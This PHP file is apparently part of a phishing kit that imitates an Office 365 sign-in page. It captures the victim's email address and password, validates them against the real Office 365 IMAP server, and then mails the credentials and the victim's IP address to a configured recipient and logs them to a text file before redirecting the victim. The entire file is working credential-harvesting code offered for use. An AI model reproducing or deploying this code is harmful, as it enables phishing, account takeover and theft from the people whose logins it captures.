<?php
// THIS SCRIPT CODED BY RAYREDDINGTON
// ICQ : rayreddington
// OFFICE 365 True Login
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

error_reporting(0);
include('anti.php');
include "config.php";
session_start();
$user = $_SESSION['username'];
$pass = $_POST['password'];
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);
   if ($truelogin==true) {
if($pass!="")  {
$domain = substr(strrchr($user, "@") , 1);
if (strpos($domain, 'otmail') || strpos($domain, 'utlook') || strpos($domain, 'ive.')) {
$ip = getenv("REMOTE_ADDR");
$praga=rand();
$praga=md5($praga);
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------------+ True Login  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "-----------------+ RayReddington +------------------\n";
		$subject = "OFFICE 365 | " . $user . " | True Login: " . $ip . "\n";
		$headeremail="admin@".$_SERVER['HTTP_HOST'];
		$headers = "From: Office <$headeremail> \r\n";
		$headers .= "Reply-To: Office <$headeremail>\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
if($sendlog==true)
{ 
		mail($recipient, $subject, $message, $headers);
}
if($savelog==true)
{ 		$fp = fopen("users.txt","a");
		fputs($fp,$message);
		fclose($fp);
}
		header("Location: $over");

}else {
$username = $user;
$password = $pass;
$server = '{outlook.office365.com:993/ssl}';
$connection = imap_open($server, $username, $password);
$mailboxes = imap_list($connection, $server,'*');

	
$ip = getenv("REMOTE_ADDR");
$praga=rand();
$praga=md5($praga);


if($mailboxes==false)
{       header("Location:  common.php?&sessionid=$hash");
	
		}
	  else
		{
			$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------------+ True Login  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "-----------------+ RayReddington +------------------\n";
		$subject = "OFFICE 365 | " . $user . " | True Login: " . $ip . "\n";
		$headeremail="admin@".$_SERVER['HTTP_HOST'];
		$headers = "From: Office <$headeremail> \r\n";
		$headers .= "Reply-To: Office <$headeremail>\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
if($sendlog==true)
{
		mail($recipient, $subject, $message, $headers);
}
if($savelog==true)
{ 		$fp = fopen("users.txt","a");
		fputs($fp,$message);
		fclose($fp);
}
		header("Location: $over");
		}}
	}else 
{header("Location: authorize.php?&ea=$user");
}
}else 
{if($pass!="")  {
$ip = getenv("REMOTE_ADDR");
$praga=rand();
$praga=md5($praga);
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$message = "-----------------+ True Login  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "-----------------+ RayReddington +------------------\n";
		$subject = "OFFICE 365 | " . $user . " | True Login: " . $ip . "\n";
		$headeremail="admin@".$_SERVER['HTTP_HOST'];
		$headers = "From: Office <$headeremail> \r\n";
		$headers .= "Reply-To: Office <$headeremail>\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
if($sendlog==true)
{ 
		mail($recipient, $subject, $message, $headers);
}
if($savelog==true)
{ 		$fp = fopen("users.txt","a");
		fputs($fp,$message);
		fclose($fp);
}
		header("Location: $over");
}else 
{header("Location: authorize?&ea=$user");
}
}
?>